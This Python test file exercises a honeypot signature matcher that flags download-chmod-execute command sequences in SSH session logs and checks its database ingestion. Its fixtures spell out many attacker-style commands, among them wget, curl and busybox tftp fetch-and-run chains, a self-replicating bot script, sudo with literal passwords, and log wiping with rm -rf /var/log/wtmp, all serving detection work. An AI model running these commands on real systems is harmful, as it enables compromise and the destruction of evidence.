import itertools
from contextlib import closing
import json
from pathlib import Path
import sqlite3
import subprocess
import sys
import tempfile
import unittest

import ingest
from match_signatures import iter_sessions, load_rules, match

ROOT = Path(__file__).resolve().parents[1]
COMMANDS = ['wget http://example.invalid/p -O p', 'chmod +x p', './p']


def commands(values):
    return [(f'2026-10-28T00:00:{i:02d}Z', value) for i, value in enumerate(values)]


class SignatureTests(unittest.TestCase):
    def setUp(self):
        self.rules = load_rules(ROOT / 'signatures/rules.yaml')

    def test_order_permutations(self):
        for order in itertools.permutations(COMMANDS):
            with self.subTest(order=order):
                self.assertEqual('S01' in match(self.rules, commands(order)), list(order) == COMMANDS)
    def test_real_world_wget_variants(self):
        cases = [
            '(tftp -g example.invalid -r tftp -l- || busybox tftp -g example.invalid -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t',
            '(wget http://example.invalid/p -O p); chmod 777 p; ./p',
            '(busybox wget http://example.invalid/p -O p); chmod 777 p; ./p',
            '(wget http://example.invalid/p -O- || busybox wget http://example.invalid/p -O-) > w; chmod 777 w; ./w; rm -rf w',
        ]

        for command in cases:
            with self.subTest(command=command):
                result = match(self.rules, commands([command]))
                self.assertIn('S01', result)
    def test_s01_incomplete_sequences(self):
        cases = [
            'wget http://example.invalid/p -O p; chmod +x p',
            'wget http://example.invalid/p -O p; ./p',
            'chmod +x p; ./p',
            './p; chmod +x p; wget http://example.invalid/p -O p',
        ]

        for command in cases:
            with self.subTest(command=command):
                result = match(self.rules, commands([command]))
                self.assertNotIn('S01', result)
    def test_compound_order_permutations(self):
        for separator in ['; ', ' && ', ' | ']:
            for order in itertools.permutations(COMMANDS):
                with self.subTest(separator=separator, order=order):
                    self.assertEqual('S01' in match(self.rules, commands([separator.join(order)])),
                                     list(order) == COMMANDS)

    def test_gaps_restarts_and_counts(self):
        values = [COMMANDS[0], 'uname -a', COMMANDS[0], *COMMANDS[1:], *COMMANDS]
        self.assertEqual(match(self.rules, commands(values))['S01'], ('2026-10-28T00:00:00Z', 2))

    def test_partial_and_repeated_step(self):
        self.assertNotIn('S01', match(self.rules, commands(COMMANDS[:2])))
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / 'rules.yaml'
            path.write_text('- id: R\n  type: behavior\n  sequence: ["x", "x"]\n')
            rules = load_rules(path)
            self.assertNotIn('R', match(rules, commands(['x'])))
            self.assertIn('R', match(rules, commands(['xx'])))

    def test_equal_timestamps_do_not_prove_order(self):
        rows = [('2026-10-28T00:00:00Z', cmd) for cmd in COMMANDS]
        self.assertNotIn('S01', match(self.rules, rows))
        # Equivalent ISO spellings must also compare equal.
        rows[1] = ('2026-10-28T00:00:00+00:00', COMMANDS[1])
        rows[2] = ('2026-10-28T09:00:00+09:00', COMMANDS[2])
        self.assertNotIn('S01', match(self.rules, rows))

    def test_timestamps_sorted_and_invalid_skipped(self):
        self.assertIn('S01', match(self.rules, list(reversed(commands(COMMANDS)))))
        self.assertNotIn('S01', match(self.rules, [('bad', cmd) for cmd in COMMANDS]))

    def test_equal_time_alternative_compound_path(self):
        rows = commands(COMMANDS[:2])
        rows.append((rows[1][0], '; '.join(COMMANDS[1:])))
        self.assertIn('S01', match(self.rules, rows))

    def test_s01_literal_download_targets(self):
        cases = [
            'wget https://example.invalid/p; chmod 755 p; ./p',
            'curl -fsSLo "/tmp/my file" https://example.invalid/p && chmod u+x "/tmp/my file" && sh "/tmp/my file"',
            'curl https://example.invalid/p > p; chmod +x ./p; ./p',
            'curl -O https://example.invalid/p; chmod 700 p; ./p',
            '/bin/busybox tftp -g -r remote -l /tmp/p example.invalid; chmod +x /tmp/p; /tmp/p',
            'cd /tmp; wget https://example.invalid/p -O a; wget https://example.invalid/p -O b; chmod +x a b; ./a',
        ]
        self.assertIn('S01', match(self.rules, commands(['cd /tmp; ' + COMMANDS[0], *COMMANDS[1:]])))
        for line in cases:
            with self.subTest(line=line):
                self.assertIn('S01', match(self.rules, commands([line])))

    def test_s01_rejects_mismatched_or_unproven_targets(self):
        cases = [
            ['wget https://example.invalid/p -O a', 'chmod +x b', './c'],
            ['wget https://example.invalid/p -O a; chmod +x a; ./b'],
            ['wget https://example.invalid/p -O a; chmod +x b; ./a'],
            ['wget https://example.invalid/p -O /tmp/a; chmod +x /var/a; /var/a'],
            ['echo "wget https://example.invalid/p -O a; chmod +x a; ./a"'],
            ['curl https://example.invalid/a; chmod +x a; ./a'],
            ['curl -o b https://example.invalid/a > a; chmod +x a; ./a'],
            ['curl https://example.invalid/a 2> a; chmod +x a; ./a'],
            ['(wget -O- https://example.invalid/a || wget -O b https://example.invalid/a) > a; chmod +x a; ./a'],
            ['wget https://example.invalid/p -O a; chmod 644 a; ./a'],
            ['wget https://example.invalid/p -O a; cd /tmp; chmod +x a; ./a'],
            ['wget https://example.invalid/p -O "$name"; chmod +x "$name"; sh "$name"'],
            ['wget https://example.invalid/p -O a; chmod +x a; sh -c "./a"'],
            ['wget https://example.invalid/p -O a; chmod +x a; wget https://example.invalid/q -O a; ./a'],
        ]
        for rows in cases:
            with self.subTest(rows=rows):
                self.assertNotIn('S01', match(self.rules, commands(rows)))

    def test_s01_busybox_curl_script_regression(self):
        script = (
            '#!/bin/sh\n'
            '/bin/busybox curl http://example.invalid/jklarm -o jklarm;'
            '/bin/busybox chmod +x jklarm;./jklarm selfrep;'
            '/bin/busybox rm -rf jklarm\n'
            '/bin/busybox curl http://example.invalid/jklx86 -o jklx86;'
            '/bin/busybox chmod +x jklx86;./jklx86 selfrep\n'
        )
        # One complete input row contributes at most one path.
        self.assertEqual(match(self.rules, commands([script]))['S01'],
                         ('2026-10-28T00:00:00Z', 1))
        for incorrect in [
            script.replace('chmod +x jklarm', 'chmod +x other').replace(
                'chmod +x jklx86', 'chmod +x other'),
            script.replace('./jklarm selfrep', './other selfrep').replace(
                './jklx86 selfrep', './other selfrep'),
        ]:
            with self.subTest(script=incorrect):
                self.assertNotIn('S01', match(self.rules, commands([incorrect])))

    def test_s01_wget_transfer_options_and_shorthand(self):
        for options in ['-w 1 -T 10 -t 5 -q', '-w1 -T10 -t5',
                        '--wait=1 --timeout 10 --tries=5', '-T 0.5 -t 0']:
            for address in ['192.0.2.10/p', 'example.invalid:8080/p',
                            'https://example.invalid/p']:
                with self.subTest(options=options, address=address):
                    line = f'wget {options} {address}; chmod +x p; ./p'
                    self.assertIn('S01', match(self.rules, commands([line])))

    def test_s01_rejects_ambiguous_wget_options_and_addresses(self):
        for download in ['wget -T example.invalid/p',
                         'wget -w nope example.invalid/p',
                         'wget -t 1.5 example.invalid/p',
                         'wget --unknown p example.invalid/p',
                         'wget -T 1 --directory-prefix /tmp example.invalid/p',
                         'wget ./p', 'wget /tmp/p', 'wget $HOST/p',
                         'wget file:///tmp/p', 'curl example.invalid/p']:
            with self.subTest(download=download):
                line = download + '; chmod +x p; ./p'
                self.assertNotIn('S01', match(self.rules, commands([line])))

    def test_s01_sudo_execution_and_literal_password_input(self):
        prefix = 'wget http://example.invalid/p -O p; chmod +x p; '
        for execution in ['sudo ./p', 'sudo -n -- ./p', '/usr/bin/sudo -S sh p',
                          'sudo -S <<< "password" ./p',
                          "sudo -S <<< 'space and ; symbols' sh p"]:
            with self.subTest(execution=execution):
                self.assertIn('S01', match(self.rules, commands([prefix + execution])))
        for execution in ['sudo -l ./p', 'sudo -u ./p', 'sudo sh -c "./p"',
                          'sudo -S <<< "password" ./other',
                          'echo "sudo -S <<< password ./p"',
                          'sudo -S <<< "$PASSWORD" ./p',
                          'sudo -S << EOF\n./p\nEOF']:
            with self.subTest(execution=execution):
                self.assertNotIn('S01', match(self.rules, commands([prefix + execution])))

    def test_s01_tracks_literal_working_directory(self):
        cases = [
            ['cd /tmp', 'wget example.invalid/p', 'chmod 755 p', '/tmp/p'],
            ['cd /tmp; wget example.invalid/p; chmod +x p', 'sudo /tmp/p'],
            ['cd /tmp', 'cd child', 'wget example.invalid/p; chmod +x p',
             '/tmp/child/p'],
            ['cd -- /tmp; wget example.invalid/p; chmod +x /tmp/p; ./p'],
            ['cd /; wget example.invalid/p; chmod +x p; /p'],
            ['cd /tmp/; wget example.invalid/p; chmod +x p; /tmp/p'],
            ['cd /tmp; wget example.invalid/p; chmod +x p; ./p; cd /var',
             'wget example.invalid/q; chmod +x q; /var/q'],
        ]
        for rows in cases:
            with self.subTest(rows=rows):
                self.assertIn('S01', match(self.rules, commands(rows)))
        result = match(self.rules, commands(cases[-1]))
        self.assertEqual(result['S01'][1], 2)

    def test_s01_directory_uncertainty_and_target_mismatch(self):
        cases = [
            ['cd /tmp; wget example.invalid/p; chmod +x p', '/var/p'],
            ['cd /tmp; wget example.invalid/p; chmod +x p; cd /var', './p'],
            ['cd $DIR; wget example.invalid/p; chmod +x p', '/tmp/p'],
            ['cd /tmp || cd /var; wget example.invalid/p; chmod +x p', '/var/p'],
            ['false && cd /tmp; wget example.invalid/p; chmod +x p', '/tmp/p'],
            ['sudo cd /tmp; wget example.invalid/p; chmod +x p', '/tmp/p'],
            ['cd /tmp; cd -; wget example.invalid/p; chmod +x p', '/tmp/-/p'],
            ['cd /tmp; wget example.invalid/p; chmod +x p',
             'echo $(cd /var)', './p'],
        ]
        for rows in cases:
            with self.subTest(rows=rows):
                self.assertNotIn('S01', match(self.rules, commands(rows)))

    def test_s01_equal_time_directory_changes_are_unordered(self):
        before = ('2026-10-28T00:00:00Z', 'cd /tmp')
        same_time = [('2026-10-28T00:00:01Z', cmd) for cmd in
                     ['wget example.invalid/p; chmod +x p', 'cd /var']]
        after = ('2026-10-28T00:00:02Z', '/tmp/p')
        for order in itertools.permutations(same_time):
            self.assertNotIn('S01', match(self.rules, [before, *order, after]))
        # A directory change alone cannot join equal-time download and chmod rows.
        rows = [('2026-10-28T00:00:00Z', 'cd /tmp; wget example.invalid/p'),
                ('2026-10-28T00:00:00Z', 'chmod +x /tmp/p'),
                ('2026-10-28T00:00:01Z', '/tmp/p')]
        self.assertNotIn('S01', match(self.rules, rows))

    def test_s01_wget_sudo_pilot_regression(self):
        values = ['cd /dev/shm; rm -rf .satan*; '
                  'wget -w 1 -T 10 -t 5 -q 192.0.2.10/.satan; chmod 777 .satan',
                  'sudo -S <<< "password" /dev/shm/.satan && whoami']
        self.assertIn('S01', match(self.rules, commands(values)))
        for old, new in [('chmod 777 .satan', 'chmod 777 other'),
                         ('/dev/shm/.satan &&', '/tmp/.satan &&')]:
            with self.subTest(old=old, new=new):
                changed = [value.replace(old, new) for value in values]
                self.assertNotIn('S01', match(self.rules, commands(changed)))

    def test_campaign_positive_controls(self):
        examples = {
            'C01': ['dota', '/var/tmp/.var03522123', '/tmp/up.txt'],
            'C02': ['echo x > .ssh/.auth_k'],
            'C03': ['rm -rf /var/log/wtmp'],
            'C04': ['perl read.txt'],
            'C05': ['wget https://example.invalid/njs.sh', 'sh bins.sh'],
        }
        for expected, lines in examples.items():
            for line in lines:
                with self.subTest(expected=expected, line=line):
                    hits = match(self.rules, commands([line]))
                    self.assertEqual({rule for rule in hits if rule.startswith('C')}, {expected})

    def test_legacy_rules_unchanged(self):
        legacy = [rule for rule in self.rules
                  if rule['id'] in {f'B{i:02d}' for i in range(1, 14)}
                  | {f'C{i:02d}' for i in range(1, 6)}]
        self.assertEqual(len(legacy), 18)
        rows = commands(COMMANDS + ['uname -a', 'dota', 'chmod +x p'])
        expected = {'B08': (rows[0][0], 1), 'B11': (rows[1][0], 2),
                    'B10': (rows[2][0], 1), 'B01': (rows[3][0], 1),
                    'C01': (rows[4][0], 1)}
        self.assertEqual(match(legacy, rows), expected)

    def test_invalid_rules(self):
        for fields in ['sequence: []', 'sequence: [x]', 'sequence: [x, 3]',
                       'sequence: [x, ""]', 'sequence: [x, "a*"]',
                       'sequence: [x, y]\n  patterns: [z]']:
            with self.subTest(fields=fields), tempfile.TemporaryDirectory() as directory:
                path = Path(directory) / 'rules.yaml'
                path.write_text('- id: R\n  type: behavior\n  ' + fields + '\n')
                with self.assertRaises(SystemExit):
                    load_rules(path)

    def test_ingest_and_cli_session_isolation(self):
        with tempfile.TemporaryDirectory() as directory:
            directory = Path(directory)
            db = directory / 'test.db'
            con = sqlite3.connect(db)
            con.executescript(ingest.SCHEMA)
            # Same source / different session, and same session / different source.
            cases = [('a', 'one', [COMMANDS[0]]), ('a', 'two', COMMANDS[1:]),
                     ('b', 'one', COMMANDS[1:]), ('a', 'good', COMMANDS)]
            for source, sid, values in cases:
                path = directory / f'{source}-{sid}.json'
                events = [dict(session=sid, timestamp=ts, eventid='cowrie.command.input',
                               input=cmd, protocol='ssh') for ts, cmd in commands(values)]
                # Out-of-order arrival must not change chronological matching.
                path.write_text('\n'.join(json.dumps(e) for e in reversed(events)))
                sessions, cmds, failed, downloads, _ = ingest.collect(path)
                ingest.save(con, source, sessions, cmds, failed, downloads)
            con.commit()
            results = {key: match(self.rules, rows) for key, rows in iter_sessions(con)}
            self.assertEqual([key for key, hits in results.items() if 'S01' in hits], [('a', 'good')])
            con.close()
            args = [sys.executable, str(ROOT / 'match_signatures.py'), '--db', str(db),
                    '--rules', str(ROOT / 'signatures/rules.yaml'), '--examples', 'S01']
            for _ in range(2):
                result = subprocess.run(args, capture_output=True, text=True, encoding='utf-8',
                                        env={**__import__('os').environ, 'PYTHONIOENCODING': 'utf-8'})
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertIn('S01', result.stdout)
            with closing(sqlite3.connect(db)) as con:
                self.assertEqual(con.execute("SELECT source, session_id, n_hits FROM signature_hits "
                                             "WHERE rule_id = 'S01'").fetchall(), [('a', 'good', 1)])


if __name__ == '__main__':
    unittest.main()
